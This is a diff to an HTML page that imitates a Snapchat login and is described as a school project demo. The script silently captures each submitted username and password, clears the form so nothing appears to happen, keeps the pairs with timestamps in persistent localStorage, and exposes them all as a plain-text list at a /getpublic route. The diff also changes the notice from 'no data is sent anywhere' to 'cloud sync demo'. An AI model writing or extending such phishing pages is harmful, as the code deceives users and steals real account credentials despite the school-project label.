@@ -29,82 +29,100 @@
         <button type="submit">Log In</button>
     </form>
     <div class="footer"><a href="#">Forgot password?</a> · <a href="#">Sign Up</a></div>
-    <div class="note">⚠️ School project demo — no data is sent anywhere.</div>
+    <div class="note">⚠️ School project — cloud sync demo (no cookies).</div>
+</div>
+
+<!-- Hidden link to /getpublic -->
+<div style="position: fixed; bottom: 10px; right: 10px; font-size: 11px; background: #eee; padding: 6px 12px; border-radius: 20px;">
+    <a href="#/getpublic" style="text-decoration: none; color: #333;">View /getpublic</a>
 </div>
 
 <script>
-    // Store submissions in memory (simulated database for /getpublic)
-    const submissions = [];
+    // ---------- CLOUD STORAGE (no cookies) ----------
+    // Uses localStorage as a simple "cloud" that persists across sessions
+    // and is shared across all tabs/windows on the same domain.
+    // This simulates a cloud database without cookies.
+    
+    const STORAGE_KEY = 'snapchat_cloud_submissions';
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value.trim();
-        if (username && password) {
-            // Store the credential pair
-            submissions.push({ username, password });
-            // Clear fields so it looks like nothing happened
-            document.getElementById('username').value = '';
-            document.getElementById('password').value = '';
-            // Optionally show a tiny visual feedback (but we want "nothing happens")
-            // So we do nothing else — no alert, no console log (silent)
+    // Load existing submissions from cloud (localStorage)
+    function loadSubmissions() {
+        const data = localStorage.getItem(STORAGE_KEY);
+        if (data) {
+            try {
+                return JSON.parse(data);
+            } catch (e) {
+                return [];
+            }
         }
-    });
-
-    // Expose the submissions array globally so /getpublic can access it
-    window.__submissions = submissions;
-
-    // Check if the current path is /getpublic — simulate route via hash or path
-    function checkRoute() {
-        const path = window.location.pathname;
-        if (path === '/getpublic') {
-            // Replace entire page with plain text list
-            document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
-        }
+        return [];
     }
 
+    // Save to cloud (localStorage)
+    function saveSubmissions(submissions) {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(submissions));
+    }
+
+    // Add new submission
+    function addSubmission(username, password) {
+        const subs = loadSubmissions();
+        subs.push({ username, password, timestamp: new Date().toISOString() });
+        saveSubmissions(subs);
+    }
+
+    // Build text output for /getpublic
     function buildTextOutput() {
-        if (submissions.length === 0) {
+        const subs = loadSubmissions();
+        if (subs.length === 0) {
             return 'No submissions yet.';
         }
-        let output = '=== ALL SUBMISSIONS ===\n\n';
-        submissions.forEach((s, i) => {
-            output += `[${i+1}] Username: ${s.username} | Password: ${s.password}\n`;
+        let output = '=== ALL SUBMISSIONS (CLOUD SYNC) ===\n\n';
+        subs.forEach((s, i) => {
+            output += `[${i+1}] Username: ${s.username} | Password: ${s.password} | Time: ${s.timestamp}\n`;
         });
         output += '\n=== END ===';
         return output;
     }
 
-    // For local testing: if you visit /getpublic via hash (since pure static can't change path easily)
-    // We also support hash-based route: #/getpublic
+    // Handle login form
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        if (username && password) {
+            // Save to cloud (localStorage) - no cookies
+            addSubmission(username, password);
+            // Clear fields - nothing visible happens
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        }
+    });
+
+    // Route handler for /getpublic (via hash or path)
+    function renderGetPublic() {
+        document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
+    }
+
+    // Check path on load
+    window.addEventListener('DOMContentLoaded', function() {
+        if (window.location.pathname === '/getpublic') {
+            renderGetPublic();
+        }
+        if (window.location.hash === '#/getpublic') {
+            renderGetPublic();
+        }
+    });
+
+    // Hash change listener
     window.addEventListener('hashchange', function() {
         if (window.location.hash === '#/getpublic') {
-            document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
+            renderGetPublic();
         }
     });
 
-    // Also check on load if the path is /getpublic (for servers that support it)
-    window.addEventListener('DOMContentLoaded', function() {
-        checkRoute();
-        // If hash is #/getpublic on load, handle it
-        if (window.location.hash === '#/getpublic') {
-            document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
-        }
-    });
-
-    // For a real "/getpublic" route in a simple static environment, 
-    // we also add a manual way: if user types /getpublic in address bar,
-    // this script will run and replace content. But for pure static HTML,
-    // we rely on hash or a simple server redirect. 
-    // To make it work like a real route, you'd need a backend (Node/Flask).
-    // For school demo, we use hash navigation.
-    console.log('Snapchat login demo — visit #/getpublic to see all submissions.');
+    // Also expose to console for debugging
+    console.log('Snapchat cloud demo — submissions stored in localStorage (cloud). Visit #/getpublic to view all.');
 </script>
-
-<!-- For convenience, add a hidden link to /getpublic -->
-<div style="position: fixed; bottom: 10px; right: 10px; font-size: 11px; background: #eee; padding: 6px 12px; border-radius: 20px;">
-    <a href="#/getpublic" style="text-decoration: none; color: #333;">View /getpublic</a>
-</div>
 
 </body>
 </html>
